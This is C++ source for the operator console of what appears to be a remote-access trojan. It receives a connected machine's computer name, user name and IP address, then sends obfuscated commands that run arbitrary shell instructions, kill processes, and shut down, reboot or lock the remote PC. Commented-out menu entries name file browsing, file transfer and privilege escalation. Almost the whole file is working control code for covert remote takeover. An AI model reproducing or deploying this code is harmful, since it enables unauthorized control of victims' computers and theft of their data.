#include "../tcpSocket/tcpSocke.h"

int process(SOCKET clifd);

int main()
{
	init_Socket();

	SOCKET serfd = CreatServerScoket();

	cout << "wait client connect...\n";

	SOCKET clifd = accept(serfd, NULL, NULL);	//如果有客户端请求连接
	if (clifd == INVALID_SOCKET)
	{
		//err("accept");
	}
	char buf[BUFSIZ] = { 0 };

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//接受连接成功并输出
	{
		decode(buf);
		cout << buf << endl;
	}
	memset(buf, 0, sizeof(buf));//缓冲区初始化，防止重复输出

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//计算机名
	{
		decode(buf);
		cout << "PCName is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//用户名
	{
		decode(buf);
		cout << "UserName is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//IP地址
	{
		decode(buf);
		cout << "IP is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	thread th = thread(process, clifd);
	th.detach();
	char beat[20] = { 0 };
	while (true)
	{
		rewind(stdin);
		if (recv(clifd, beat, 20, 0) > 0)
		{
			decode(beat);
			cout << beat << endl;
		}
	}
	close_Socket();
	return 0;
}

int process(SOCKET clifd)
{
	char code[50] = { 0 };
	char sendbuf[BUFSIZ] = { 0 };
	while (true)
	{
		cout << "Enter prompt: " << endl;
		//cout << "1.  filebrowse: File browsing" << endl;
		cout << "2.  shell: Execute shell instructions" << endl;
		//cout << "3.  download: File download" << endl;
		//cout << "4.  upload: File upload" << endl;
		//cout << "5.  upright: Get administrator privileges" << endl;
		cout << "6.  kill: Kill the terminal" << endl;
		cout << "7.  shutdown: shutdown the pc" << endl;
		cout << "8.  reboot: Restart the computer" << endl;
		cout << "9.  cancel: Cancel shutdown" << endl;
		cout << "10. lock: Lock Screen" << endl;
		cout << "Please enter the corresponding instruction: " << endl;
		rewind(stdin);
		cin >> code;//输入并加密指令
		encode(code);
		send(clifd, code, 50, 0);
		decode(code);
		if (!strcmp(code, "filebrowse"))
		{
			char file[Row] = { 0 };//定义、初始化、输入提示
			char path[100] = { 0 };

			cout << "please input the path" << endl;
			cout << "use two '\\'" << endl;
			cout << "just as 'D:\\\\Games', check the files in Games directory" << endl;
			cout << "and 'D:\\' check the files under drive D. " << endl;

			rewind(stdin);
			cin >> path;//输入、加密并发送指令
			encode(path);
			send(clifd, path, 100, 0);
			do
			{
				recv(clifd, file, Row, 0);
				cout << file << endl;
			} while (file[0] != 0);
			continue;
		}
		else if (strcmp(code, "shell") == 0)
		{
			char shell[BUFSIZ] = { 0 };
			char res[BUFSIZ * 6] = { 0 };
			cout << "Please enter the shell instruction: ";
			rewind(stdin);
			cin >> shell;
			encode(shell);
			send(clifd, shell, BUFSIZ, 0);
			if (recv(clifd, res, BUFSIZ * 6, 0) > 0)
			{
				rewind(stdin);
				//decode(res);
				cout << res << endl;
			}
			continue;
		}
		else if (strcmp(code, "kill") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "reboot") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "shutdown") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "lock") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				cout << sendbuf << endl;
			}
			rewind(stdin);
			continue;
		}
		else
		{
			cout << "error code" << endl;
			continue;
			rewind(stdin);
		}
		ZeroMemory(code, sizeof(code));
	}
	return 0;
}